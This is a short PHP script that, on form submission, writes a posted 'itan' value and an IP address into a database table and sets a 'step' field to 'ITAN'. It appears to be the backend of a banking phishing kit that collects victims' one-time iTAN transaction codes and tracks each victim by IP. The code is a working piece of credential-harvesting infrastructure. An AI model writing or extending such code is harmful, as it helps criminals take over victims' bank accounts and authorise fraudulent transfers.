<?php

if( $_POST ) {

    include_once '../app.php';
    $db = new MysqliDb ($db_infos['host'], $db_infos['db_user'], $db_infos['db_pass'], $db_infos['database_name']);

    $itan = $_POST['itan'];
    $ip  = $_POST['ip'];

    $data = [
        'itan'   => $itan,
        'ip'    => $ip,
        'step'  => 'ITAN'
    ];

    $db->where ('ip', $ip);
    $db->update ('data', $data);

    $db->disconnect();

}

?>